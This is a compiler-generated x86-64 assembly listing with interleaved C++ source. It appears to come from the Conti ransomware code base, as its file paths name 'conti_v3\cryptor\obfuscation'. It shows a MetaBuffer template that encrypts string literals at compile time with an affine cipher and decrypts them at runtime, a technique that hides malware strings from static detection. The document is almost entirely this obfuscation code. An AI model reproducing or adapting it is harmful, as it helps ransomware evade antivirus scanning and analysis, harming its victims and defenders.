  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00203	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00207	88 85 c0 00 00
	00		 mov	 BYTE PTR tv175[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0020d	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00214	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0021b	5f		 pop	 rdi
  0021c	5d		 pop	 rbp
  0021d	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 3c	 sub	 eax, 60			; 0000003cH
  0002d	6b c0 d4	 imul	 eax, eax, -44		; ffffffffffffffd4H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 65	 imul	 eax, eax, 101		; 00000065H
  0002d	83 c0 3c	 add	 eax, 60			; 0000003cH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0d	 cmp	 QWORD PTR i$1[rbp], 13
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv189 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
